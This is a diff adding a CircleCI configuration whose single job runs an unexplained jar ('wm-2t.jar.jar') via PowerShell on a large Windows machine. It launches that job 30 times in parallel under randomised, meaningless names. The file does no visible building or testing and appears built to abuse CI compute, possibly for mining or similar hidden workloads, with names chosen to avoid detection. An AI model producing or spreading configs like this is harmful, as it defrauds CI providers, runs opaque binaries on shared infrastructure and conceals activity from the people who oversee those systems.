@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  encryptlike44949:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: tionQUEUE230299
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  PAUSE690315FUL:
+    jobs:
+      - encryptlike44949:
+          name: stagement527653
+      - encryptlike44949:
+          name: server34622ety
+      - encryptlike44949:
+          name: derrestore444028
+      - encryptlike44949:
+          name: ASYNCBER983802
+      - encryptlike44949:
+          name: ISMENCODE427794
+      - encryptlike44949:
+          name: LOGOUTNET704332
+      - encryptlike44949:
+          name: mainJOB337019
+      - encryptlike44949:
+          name: PIPEdelta70120
+      - encryptlike44949:
+          name: NANOload279484
+      - encryptlike44949:
+          name: FETCHfake896909
+      - encryptlike44949:
+          name: ANALYZE95hyper3210
+      - encryptlike44949:
+          name: EXECMEGA702541
+      - encryptlike44949:
+          name: serviceWISE583760
+      - encryptlike44949:
+          name: TASKparse561651
+      - encryptlike44949:
+          name: ANALYZE453953UR
+      - encryptlike44949:
+          name: secure99WORK8289
+      - encryptlike44949:
+          name: setupfake553554
+      - encryptlike44949:
+          name: restore99PER4100
+      - encryptlike44949:
+          name: backup68ness5038
+      - encryptlike44949:
+          name: phaseKEY334416
+      - encryptlike44949:
+          name: BUFFER736148FUL
+      - encryptlike44949:
+          name: syncICAL379395
+      - encryptlike44949:
+          name: buildEXT330492
+      - encryptlike44949:
+          name: service168457mega
+      - encryptlike44949:
+          name: createGAMMA731004
+      - encryptlike44949:
+          name: SENDPROTO49755
+      - encryptlike44949:
+          name: node772023api
+      - encryptlike44949:
+          name: IVEVIEW121331
+      - encryptlike44949:
+          name: pipebase664258
+      - encryptlike44949:
+          name: hide931701DOM
